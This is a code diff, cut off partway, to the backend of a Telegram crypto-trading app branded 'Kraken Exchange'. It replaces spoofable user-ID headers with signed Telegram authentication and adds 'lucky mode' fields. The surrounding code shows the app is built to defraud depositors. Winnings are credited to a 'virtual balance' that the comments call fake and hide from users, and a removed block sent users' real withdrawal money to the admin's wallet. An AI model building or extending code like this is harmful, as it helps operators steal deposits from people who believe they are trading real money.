@@ -1,5 +1,5 @@
 
-import os, json, time, hashlib, asyncio
+import os, json, time, hashlib, hmac, asyncio
 from datetime import datetime, timedelta, timezone
 from typing import Optional, Dict, Any, List
 from fastapi import FastAPI, Request, Depends, HTTPException, UploadFile, File, Form, Query, APIRouter
@@ -22,10 +22,40 @@ if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN environment variable is required")
 if not ADMIN_ID:
     raise ValueError("ADMIN_ID environment variable is required")
-HOST_BASE = os.getenv("HOST_BASE", "https://rengle.site")
+# Auto-detect HOST_BASE for different environments
+_replit_domain = os.getenv("REPLIT_DEV_DOMAIN")
+if _replit_domain:
+    HOST_BASE = f"https://{_replit_domain}"
+else:
+    HOST_BASE = os.getenv("HOST_BASE", "https://rengle.site")
 MIN_DEPOSIT_USDT = float(os.getenv("MIN_DEPOSIT_USDT", "50"))
 import ssl
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from fastapi.middleware.cors import CORSMiddleware
+
+def validate_telegram_init_data(init_data_raw: str, bot_token: str) -> dict | None:
+    try:
+        parsed = parse_qs(init_data_raw, keep_blank_values=True)
+        received_hash = parsed.pop("hash", [None])[0]
+        if not received_hash:
+            return None
+        sorted_params = sorted(
+            (k, v[0]) for k, v in parsed.items()
+        )
+        data_check_string = "\n".join(f"{k}={v}" for k, v in sorted_params)
+        secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
+        expected_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
+        if not hmac.compare_digest(expected_hash, received_hash):
+            return None
+        auth_date = int(parsed.get("auth_date", ["0"])[0])
+        if auth_date and (time.time() - auth_date) > 86400:
+            return None
+        user_data = parsed.get("user", [None])[0]
+        if user_data:
+            return json.loads(user_data)
+        return None
+    except Exception:
+        return None
 
 raw_db_url = os.getenv("DATABASE_URL", "sqlite+aiosqlite:///./app.db")
 print(f"[Kraken] DATABASE_URL: {raw_db_url[:50] if raw_db_url else 'NOT SET'}...")
@@ -90,6 +120,10 @@ class User(Base):
     is_premium=Column(Boolean, default=False)  # Premium subscription status
     is_blocked=Column(Boolean, default=False)  # Account blocked status
     block_reason=Column(Text, nullable=True)  # Reason for blocking
+    lucky_mode=Column(Boolean, default=False)
+    lucky_until=Column(DateTime, nullable=True)
+    lucky_max_wins=Column(Integer, nullable=True)
+    lucky_wins_used=Column(Integer, default=0)
     created_at=Column(DateTime, default=datetime.utcnow)
 
 class Transaction(Base):
@@ -139,7 +173,7 @@ class Trade(Base):
     opened_at=Column(DateTime, default=datetime.utcnow)
     duration_sec=Column(Integer, default=60)
     status=Column(String, default="active")  # active, completed, canceled
-    result=Column(String, nullable=True)  # win, loss, push
+    result=Column(String, nullable=True)  # win, loss
     payout=Column(Float, default=0.0)
     closed_at=Column(DateTime, nullable=True)
 
@@ -212,17 +246,11 @@ class AdminLog(Base):
 # Admin reply state: stores which user admin is replying to
 admin_reply_state = {}
 
-# Admin broadcast state: stores broadcast mode (all, limited, or specific user)
-# Format: {admin_id: {"type": "all"|"limited"|"user", "target": user_id|count, "delivery": "app_chat"|"telegram_chat"}}
-admin_broadcast_state = {}
 
-# Admin balance state: stores balance management flow
-# Format: {admin_id: {"action": "select_user"|"select_action", "profile_id": int}}
-admin_balance_state = {}
 
 # Admin FSM states for inline button dialogs
-# States: awaiting_message, awaiting_amount, awaiting_reason, awaiting_search_id, awaiting_broadcast
-# Format: {admin_id: {"state": "...", "user_id": ..., "action": "...", "data": {...}, "message_id": ...}}
+# States: awaiting_message
+# Format: {admin_id: {"state": "awaiting_message", "user_id": ..., "data": {...}}}
 admin_states = {}
 
 async def get_db():
@@ -444,6 +472,49 @@ app=FastAPI(title="Kraken Exchange")
 app.mount("/static", StaticFiles(directory="static"), name="static")
 app.mount("/i18n", StaticFiles(directory="i18n"), name="i18n")
 templates=Jinja2Templates(directory="templates")
+
+_cors_origins = ["https://web.telegram.org", "https://t.me"]
+if _replit_domain:
+    _cors_origins.append(f"https://{_replit_domain}")
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=_cors_origins,
+    allow_methods=["GET", "POST", "PUT", "DELETE"],
+    allow_headers=["*"],
+    allow_credentials=False,
+)
+
+_SKIP_AUTH_PATHS = frozenset(["/", "/health", "/webhook", "/webhook/cryptobot", "/api/cryptobot/webhook", "/favicon.ico"])
+_SKIP_AUTH_PREFIXES = ("/static/", "/i18n/")
+
+@app.middleware("http")
+async def telegram_auth_middleware(request: Request, call_next):
+    path = request.url.path
+    if path in _SKIP_AUTH_PATHS or path.startswith(_SKIP_AUTH_PREFIXES):
+        return await call_next(request)
+    try:
+        init_data_raw = request.headers.get("X-Telegram-Init-Data", "")
+        if not init_data_raw:
+            return JSONResponse({"error": "Unauthorized"}, status_code=401)
+        user_data = validate_telegram_init_data(init_data_raw, BOT_TOKEN)
+        if not user_data:
+            return JSONResponse({"error": "Unauthorized"}, status_code=401)
+        request.state.telegram_id = str(user_data.get("id", ""))
+        request.state.telegram_username = user_data.get("username")
+        if not request.state.telegram_id:
+            return JSONResponse({"error": "Unauthorized"}, status_code=401)
+        return await call_next(request)
+    except Exception:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+
+@app.exception_handler(Exception)
+async def generic_exception_handler(request, exc):
+    return JSONResponse({"error": "Internal server error"}, status_code=500)
+
+@app.exception_handler(404)
+async def not_found_handler(request, exc):
+    return JSONResponse({"error": "Not found"}, status_code=404)
+
 @app.on_event("startup")
 async def startup():
     async with engine.begin() as conn:
@@ -501,6 +572,18 @@ async def startup():
         except Exception:
             pass
         
+        # Auto-migration: Add lucky mode columns
+        for col_name, col_type, col_default in [
+            ("lucky_mode", "BOOLEAN", "FALSE"),
+            ("lucky_until", "TIMESTAMP", "NULL"),
+            ("lucky_max_wins", "INTEGER", "NULL"),
+            ("lucky_wins_used", "INTEGER", "0"),
+        ]:
+            try:
+                await conn.execute(text(f"ALTER TABLE users ADD COLUMN {col_name} {col_type} DEFAULT {col_default}"))
+            except:
+                pass
+        
         await conn.commit()
     
     # Auto-setup Telegram webhook on startup
@@ -554,13 +637,18 @@ async def get_or_create_user(db: AsyncSession, telegram_id: str, username: str|N
     u=User(telegram_id=str(telegram_id), username=username, language=language, profile_id=int(maxpid)+1, wallets={}, addresses={}, referral_code=ref_code, referred_by=referred_by)
     db.add(u); await db.commit(); return u
 @app.post("/api/auth/ensure")
-async def api_ensure_user(p: EnsureUser, db: AsyncSession=Depends(get_db)):
-    if not p.telegram_id: p.telegram_id=999999; p.username=p.username or "localtester"
-    u=await get_or_create_user(db, str(p.telegram_id), p.username, p.language or "ru")
+async def api_ensure_user(p: EnsureUser, request: Request, db: AsyncSession=Depends(get_db)):
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    username = getattr(request.state, 'telegram_username', None)
+    u=await get_or_create_user(db, str(tid), username, p.language or "ru")
     return {"ok":True, "user_id":u.id, "telegram_id":u.telegram_id, "profile_id":u.profile_id}
 @app.get("/api/user")
 async def api_user(db: AsyncSession=Depends(get_db), request: Request=None):
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u: u=await get_or_create_user(db, str(tid), "localtester", "ru")
     is_admin = str(tid) == str(ADMIN_ID)
@@ -573,13 +661,16 @@ async def api_user(db: AsyncSession=Depends(get_db), request: Request=None):
     if 'RUB' in wallets:
         del wallets['RUB']
     
-    return {"id":u.id,"telegram_id":u.telegram_id,"profile_id":u.profile_id,"language":u.language,"balance_usdt":displayed_balance,"balance_rub":u.balance_rub or 0.0,"preferred_fiat":u.preferred_fiat or "RUB","wallets":wallets,"addresses":u.addresses or {},"is_admin":is_admin,"is_verified":u.is_verified or False,"is_premium":u.is_premium or False,"is_blocked":u.is_blocked or False,"block_reason":u.block_reason}
+    resp = {"id":u.id,"telegram_id":u.telegram_id,"profile_id":u.profile_id,"language":u.language,"balance_usdt":displayed_balance,"balance_rub":u.balance_rub or 0.0,"preferred_fiat":u.preferred_fiat or "RUB","wallets":wallets,"addresses":u.addresses or {},"is_verified":u.is_verified or False,"is_premium":u.is_premium or False,"is_blocked":u.is_blocked or False,"block_reason":u.block_reason}
+    if is_admin:
+        resp["is_admin"] = True
+    return resp
 
 # ========== NOTIFICATIONS API ==========
 @app.get("/api/notifications")
 async def api_get_notifications(db: AsyncSession=Depends(get_db), request: Request=None):
     """Get all notifications for user (broadcasts + personal messages)"""
-    tid = request.headers.get("X-Telegram-Id")
+    tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return {"notifications": [], "unread_count": 0}
     
@@ -633,7 +724,7 @@ async def api_get_notifications(db: AsyncSession=Depends(get_db), request: Reque
 @app.post("/api/notifications/read")
 async def api_mark_notifications_read(request: Request, db: AsyncSession=Depends(get_db)):
     """Mark notifications as read"""
-    tid = request.headers.get("X-Telegram-Id")
+    tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return {"ok": False}
     
@@ -675,7 +766,7 @@ async def api_mark_notifications_read(request: Request, db: AsyncSession=Depends
 @app.get("/api/notifications/count")
 async def api_notifications_count(db: AsyncSession=Depends(get_db), request: Request=None):
     """Get unread notifications count"""
-    tid = request.headers.get("X-Telegram-Id")
+    tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return {"count": 0}
     
@@ -708,7 +799,9 @@ async def api_notifications_count(db: AsyncSession=Depends(get_db), request: Req
 @app.get("/api/referrals")
 async def api_referrals(db: AsyncSession=Depends(get_db), request: Request=None):
     """Get referral info for current user"""
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u:
         return {"error": "User not found"}
@@ -813,7 +906,9 @@ class SetCurrencyPayload(BaseModel):
 @app.post("/api/user/currency")
 async def api_set_currency(p: SetCurrencyPayload, db: AsyncSession=Depends(get_db), request: Request=None):
     """Set user's preferred fiat currency"""
-    tid = request.headers.get("X-Telegram-Id", "999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
     if not u:
         return JSONResponse({"ok": False, "error": "User not found"})
@@ -870,7 +965,9 @@ async def api_tickers():
 
 @app.get("/api/history")
 async def api_history(symbol: str|None=None, db: AsyncSession=Depends(get_db), request: Request=None):
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     
     # Get transactions
@@ -1017,8 +1114,10 @@ async def crypto_pay_transfer(user_id: int, amount: float, spend_id: str, commen
         return {"ok": False, "error": str(e)}
 @app.post("/api/deposit/create_invoice")
 async def api_deposit_create(p: DepositPayload, db: AsyncSession=Depends(get_db), request: Request=None):
-    DEPOSIT_FEE_PERCENT = 5.0  # 5% комиссия на депозит
-    tid=request.headers.get("X-Telegram-Id","999999")
+    DEPOSIT_FEE_PERCENT = 0.0  # 0% комиссия на депозит
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     if tid != str(ADMIN_ID) and p.amount < MIN_DEPOSIT_USDT: return JSONResponse({"ok":False,"error":f"Минимальная сумма {MIN_DEPOSIT_USDT} USDT"})
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first() or await get_or_create_user(db, tid, "localtester","ru")
     
@@ -1101,9 +1200,7 @@ async def api_deposit_create(p: DepositPayload, db: AsyncSession=Depends(get_db)
             else:
                 result = await bot_send_message(int(u.telegram_id), 
                     f"💰 <b>Пополнение счета</b>\n\n"
-                    f"📌 Сумма: <b>{p.amount} USDT</b>\n"
-                    f"💳 Комиссия: {fee_amount} USDT ({DEPOSIT_FEE_PERCENT}%)\n"
-                    f"✅ К зачислению: <b>{amount_after_fee} USDT</b>\n\n"
+                    f"📌 Сумма: <b>{p.amount} USDT</b>\n\n"
                     f"🤖 Нажмите <b>«Оплатить в Crypto Bot»</b> ниже.\n"
                     f"Бот откроет счет для оплаты выбранной суммы.",
                     [[{"text":"💳 Оплатить в Crypto Bot","url":bot_invoice_url}],
@@ -1129,7 +1226,10 @@ async def api_deposit_create(p: DepositPayload, db: AsyncSession=Depends(get_db)
     return {"ok":True,"invoice_id":invoice_id,"fee":fee_amount,"amount_after_fee":amount_after_fee,"pay_url":pay_url}
 @app.get("/api/check_deposit")
 async def api_check_deposit(invoice_id:str, db: AsyncSession=Depends(get_db), request: Request=None):
-    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}; params={"invoice_ids": invoice_id}; status="active"; amount=0.0
     try:
         async with aiohttp.ClientSession() as s:
@@ -1147,7 +1247,7 @@ async def api_check_deposit(invoice_id:str, db: AsyncSession=Depends(get_db), re
             amount_after_fee = (trx.details or {}).get("amount_after_fee", trx.amount)  # Если нет комиссии (старые депозиты), зачисляем полную сумму
             fee_amount = (trx.details or {}).get("fee", 0)
             trx.status="done"; u.balance_usdt=(u.balance_usdt or 0)+ amount_after_fee; await db.commit()
-            try: await bot_send_message(int(u.telegram_id), f"✅ Поздравляем! Депозит получен\n\n💰 Сумма: {trx.amount} USDT\n💳 Комиссия: {fee_amount} USDT\n✅ Зачислено: {amount_after_fee} USDT\n💵 Баланс: {round(u.balance_usdt,2)} USDT")
+            try: await bot_send_message(int(u.telegram_id), f"✅ Поздравляем! Депозит получен\n\n💰 Зачислено: {trx.amount} USDT\n💵 Баланс: {round(u.balance_usdt,2)} USDT")
             except: pass
         return {"ok":True,"paid":True,"amount": trx.amount if trx else amount, "new_balance": u.balance_usdt}
     return {"ok":True,"paid":False}
@@ -1178,7 +1278,9 @@ async def api_exchange_rub(p: ExchangeRubPayload, db: AsyncSession=Depends(get_d
     if p.amount <= 0:
         return JSONResponse({"ok": False, "error": "Введите сумму больше 0"})
     
-    tid = request.headers.get("X-Telegram-Id", "999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
     if not u:
         return JSONResponse({"ok": False, "error": "Пользователь не найден"})
@@ -1269,7 +1371,7 @@ async def api_exchange_rub_quote(from_currency: str = Query(..., alias="from"), 
 
 @app.post("/api/withdraw")
 async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), request: Request=None):
-    WITHDRAW_FEE_PERCENT = 10.0  # 10% комиссия на вывод
+    WITHDRAW_FEE_PERCENT = 0.0  # 0% комиссия на вывод
     
     # Проверка минимальной суммы в рублях
     if p.amount_rub < MIN_WITHDRAW_RUB:
@@ -1282,7 +1384,9 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
     if not p.full_name or len(p.full_name) < 3:
         return JSONResponse({"ok":False,"error":"Введите ФИО получателя"})
     
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     
     # Получаем актуальный курс USDT/RUB
@@ -1299,7 +1403,7 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
     # Check DISPLAYED balance (real + virtual) - user doesn't know the difference
     displayed_balance = (u.balance_usdt or 0) + (u.virtual_balance or 0)
     if displayed_balance < usdt_required:
-        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.2f} USDT (включая комиссию {fee_usdt:.2f})"})
+        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.2f} USDT"})
     
     # Сумма в рублях (что ввёл пользователь)
     amount_rub = p.amount_rub
@@ -1317,30 +1421,10 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
     u.balance_usdt = real_balance - deduct_from_real
     await db.commit()
     
-    # Track how much real money was actually deducted (for Crypto Pay transfer)
+    # Track how much real money was actually deducted
     real_money_deducted = deduct_from_real
     
-    # Transfer ONLY real money to admin's wallet (if any)
-    transfer_result = {"ok": True, "result": {"transfer_id": None}}
-    if real_money_deducted > 0.01:  # Only transfer if there's real money
-        transfer_result = await crypto_pay_transfer(
-            user_id=ADMIN_ID,
-            amount=real_money_deducted,
-            spend_id=f"withdraw_{u.id}_{int(datetime.utcnow().timestamp())}",
-            comment=f"Вывод пользователя #{u.profile_id or u.telegram_id}"
-        )
-        
-        # Check if transfer succeeded
-        if not transfer_result.get("ok"):
-            # Transfer failed - refund user (both balances)
-            u.balance_usdt = (u.balance_usdt or 0) + deduct_from_real
-            u.virtual_balance = (u.virtual_balance or 0) + deduct_from_virtual
-            await db.commit()
-            error_msg = transfer_result.get("error", "Ошибка перевода")
-            print(f"[WITHDRAWAL] Failed to transfer to admin: {error_msg}")
-            return JSONResponse({"ok":False,"error":f"Ошибка перевода: {error_msg}"})
-    
-    print(f"[WITHDRAWAL] Request created. Real: {real_money_deducted:.2f} USDT to admin, Virtual: {deduct_from_virtual:.2f} USDT (fake). User {u.telegram_id}")
+    print(f"[WITHDRAWAL] Request created. Real: {real_money_deducted:.2f} USDT, Virtual: {deduct_from_virtual:.2f} USDT. User {u.telegram_id}")
     
     # Создаём заявку на вывод с данными карты (хранится только last 4 digits)
     card_last4 = p.card_number[-4:] if len(p.card_number) >= 4 else "****"
@@ -1387,8 +1471,6 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
         # Уведомление пользователю
         user_msg = f"📤 <b>Заявка на вывод создана</b>\n\n"
         user_msg += f"💰 Сумма: <b>{p.amount_usdt:.2f} USDT</b>\n"
-        user_msg += f"💳 Комиссия: <b>{fee_usdt:.4f} USDT ({WITHDRAW_FEE_PERCENT}%)</b>\n"
-        user_msg += f"✅ К выводу: <b>{amount_after_fee:.4f} USDT</b>\n"
         user_msg += f"💵 На карту: <b>~{amount_rub:,.0f} ₽</b>\n"
         user_msg += f"💳 Карта: <code>****{card_last4}</code>\n\n"
         user_msg += f"⏳ Статус: <b>В обработке</b>\n\n"
@@ -1491,7 +1573,9 @@ async def api_exchange(payload: Dict[str,Any], db: AsyncSession=Depends(get_db),
         return JSONResponse({"ok":False,"error":"Нельзя выбрать одинаковую валюту"})
     
     # Get user
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u:
         return JSONResponse({"ok":False,"error":"Пользователь не найден"})
@@ -1718,7 +1802,10 @@ async def api_trade_order(p: TradeOrder, db: AsyncSession=Depends(get_db), reque
     PAYOUT_PERCENT = 70.0  # 70% выплата при выигрыше
     
     if p.amount_usdt<5: return JSONResponse({"ok":False,"error":"Мин. ставка 5 USDT"})
-    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     
     # Calculate total cost including fee
     trade_fee = round(p.amount_usdt * (TRADE_FEE_PERCENT / 100), 6)
@@ -1759,34 +1846,23 @@ async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), reque
         # Get REAL current price from OKX
         cur = await okx_get_price(symbol) or tr.start_price
         
-        # Calculate REAL result based on price movement
         direction=1 if (cur-tr.start_price)>0 else (-1 if (cur-tr.start_price)<0 else 0)
         
-        # Determine win/loss based on user's prediction vs actual price movement
-        if tr.side == 'buy':  # User predicted UP
-            win = direction > 0  # Win if price went UP
-        else:  # User predicted DOWN
-            win = direction < 0  # Win if price went DOWN
+        if tr.side == 'buy':
+            win = direction > 0
+        else:
+            win = direction < 0
         
-        # Calculate payout: stake + 70% profit on WIN
-        PAYOUT_MULTIPLIER = 0.7  # 70% profit on win
+        PAYOUT_MULTIPLIER = 0.7
         payout = round(tr.amount_usdt * PAYOUT_MULTIPLIER, 6) if win else 0.0
-        total_return = tr.amount_usdt + payout if win else (tr.amount_usdt if direction == 0 else 0.0)
         
-        tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.close_price=cur; tr.result="win" if win else ("push" if direction==0 else "loss"); tr.payout=payout
+        tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.close_price=cur; tr.result="win" if win else "loss"; tr.payout=payout
         
         print(f"[TRADE CLOSED] {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${cur:.2f}, Result: {tr.result.upper()}, Payout: {payout:.2f} USDT")
         
-        # CRITICAL: All returns go to VIRTUAL BALANCE (fake money!)
-        # Fee is NEVER returned - admin always keeps 2% commission
         if win: 
-            # WIN: Return stake + payout to VIRTUAL balance (user doesn't know it's fake)
             u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt + payout
             print(f"[TRADE WIN] User {u.telegram_id} gets {tr.amount_usdt + payout:.2f} USDT to VIRTUAL balance")
-        elif direction == 0: 
-            # PUSH (draw): Return stake only to VIRTUAL balance
-            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt
-            print(f"[TRADE PUSH] User {u.telegram_id} gets {tr.amount_usdt:.2f} USDT back to VIRTUAL balance")
         # LOSS: Nothing returned, admin keeps everything (stake + fee)
         q=await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="trade", Transaction.status=="pending").order_by(Transaction.created_at.desc())); trx=q.scalars().first()
         if trx: 
@@ -1828,7 +1904,9 @@ async def api_active_trades(db: AsyncSession=Depends(get_db), request: Request=N
     Get active trades with entry marks for chart display
     Returns: List of active trades with entry price, time, and direction
     """
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u: return []
     
@@ -1861,10 +1939,10 @@ async def api_active_trades(db: AsyncSession=Depends(get_db), request: Request=N
             "side": t.side,  # 'buy' or 'sell'
             "amount_usdt": t.amount_usdt,
             "entry_price": t.start_price,
+            "start_price": t.start_price,
             "entry_time": t.opened_at.isoformat(),
             "expire_at": expire_at.isoformat(),
             "time_left_sec": time_left_sec
-            # REMOVED predicted_result - честная торговля!
         })
     
     return result
@@ -1880,10 +1958,12 @@ async def api_trades_list(
     """
     Get trades list with filtering
     - status=active: Only active trades (pending)
-    - status=closed: Only completed trades (win/loss/push)
+    - status=closed: Only completed trades (win/loss)
     - status=all or no filter: All trades
     """
-    tid = request.headers.get("X-Telegram-Id", "999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u = (await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u:
         return {"trades": [], "total": 0, "page": page, "limit": limit}
@@ -1952,7 +2032,10 @@ async def api_trades_list(
 
 @app.get("/api/stats")
 async def api_stats(db: AsyncSession=Depends(get_db), request: Request=None):
-    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     trades=(await db.execute(select(Trade).where(Trade.user_id==u.id).order_by(Trade.opened_at.desc()).limit(200))).scalars().all()
     earned=sum(t.payout for t in trades if t.result=="win"); lost=sum(t.amount_usdt for t in trades if t.result=="loss")
     eq=0.0; equity=[]; 
@@ -1998,14 +2081,20 @@ async def api_stats(db: AsyncSession=Depends(get_db), request: Request=None):
 
 @app.get("/api/support")
 async def api_support_list(db: AsyncSession=Depends(get_db), request: Request=None):
-    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     msgs=(await db.execute(select(SupportMessage).where(SupportMessage.user_id==u.id).order_by(SupportMessage.created_at.asc()))).scalars().all()
     is_admin = str(tid) == str(ADMIN_ID)
     return {"is_admin": is_admin, "messages": [{"id":m.id,"sender":m.sender,"text":m.text,"file_path":m.file_path,"created_at":m.created_at.isoformat()} for m in msgs]}
 
 @app.post("/api/support")
 async def api_support_send(request: Request, db: AsyncSession=Depends(get_db), file: UploadFile=File(None), text: str=Form(None)):
-    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     file_path=None
     if file:
         os.makedirs("static/uploads", exist_ok=True); name=f"{int(time.time())}_{file.filename}"; dest=os.path.join("static/uploads", name)
@@ -2032,7 +2121,9 @@ async def api_support_send(request: Request, db: AsyncSession=Depends(get_db), f
 @app.get("/api/admin_messages")
 async def api_admin_messages(db: AsyncSession=Depends(get_db), request: Request=None):
     """Get admin messages for current user (personal messages + global broadcasts only)"""
-    tid=request.headers.get("X-Telegram-Id","999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     
     if not u:
@@ -2066,7 +2157,9 @@ async def api_admin_messages(db: AsyncSession=Depends(get_db), request: Request=
 
 @app.delete("/api/support/{message_id}")
 async def delete_support_message(message_id: int, request: Request, db: AsyncSession=Depends(get_db)):
-    tid = request.headers.get("X-Telegram-Id", "999999")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
     current_user = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
     if not current_user:
         raise HTTPException(404, "User not found")
@@ -2105,8 +2198,8 @@ class CheckActivate(BaseModel):
     check_code: str
 
 def check_admin(request: Request):
-    admin_id=request.query_params.get("admin_id")
-    if not admin_id or int(admin_id)!=int(ADMIN_ID): raise HTTPException(403,"Forbidden")
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid or str(tid) != str(ADMIN_ID): raise HTTPException(403,"Forbidden")
     return True
 
 @app.post("/api/admin/user/{user_id}/balance")
@@ -2119,8 +2212,7 @@ async def api_admin_balance(user_id:int, payload: BalanceEdit, request: Request,
 @app.post("/api/admin/check/create")
 async def api_admin_check_create(payload: CheckCreate, request: Request, db: AsyncSession=Depends(get_db)):
     """Админ создает чек (списывает USDT с своего баланса)"""
-    # SECURE: Get authenticated Telegram ID from header (not query param!)
-    auth_tid = request.headers.get('X-Telegram-Id')
+    auth_tid = getattr(request.state, 'telegram_id', None)
     if not auth_tid or str(auth_tid) != str(ADMIN_ID):
         raise HTTPException(403, "Forbidden: Only admin can create checks")
     
@@ -2186,7 +2278,7 @@ class UserCheckCreate(BaseModel):
 async def api_user_check_create(payload: UserCheckCreate, request: Request, db: AsyncSession=Depends(get_db)):
     """Premium пользователь создаёт чек (списывается с его баланса)"""
     
-    tid = request.headers.get("X-Telegram-Id")
+    tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         raise HTTPException(401, "Unauthorized")
     
@@ -2202,9 +2294,13 @@ async def api_user_check_create(payload: UserCheckCreate, request: Request, db: 
     if payload.amount < 1:
         return JSONResponse({"ok": False, "error": "Минимальная сумма чека: 1 USDT"})
     
-    # Проверяем баланс
-    if (user.balance_usdt or 0) < payload.amount:
-        return JSONResponse({"ok": False, "error": f"Недостаточно средств. Баланс: {user.balance_usdt:.2f} USDT"})
+    # Проверяем общий баланс (реальный + виртуальный)
+    real_bal = user.balance_usdt or 0
+    virtual_bal = user.virtual_balance or 0
+    total_bal = real_bal + virtual_bal
+    
+    if total_bal < payload.amount:
+        return JSONResponse({"ok": False, "error": f"Недостаточно средств. Баланс: {total_bal:.2f} USDT"})
     
     # Генерируем код
     import secrets
@@ -2213,8 +2309,14 @@ async def api_user_check_create(payload: UserCheckCreate, request: Request, db: 
     # Дата истечения
     expires_at = datetime.utcnow() + timedelta(hours=payload.expires_in_hours)
     
-    # Списываем с баланса
-    user.balance_usdt = (user.balance_usdt or 0) - payload.amount
+    # Списываем с баланса (сначала виртуальный, потом реальный)
+    amount_to_deduct = payload.amount
+    deducted_from_virtual = min(virtual_bal, amount_to_deduct)
+    user.virtual_balance = virtual_bal - deducted_from_virtual
+    amount_to_deduct -= deducted_from_virtual
+    
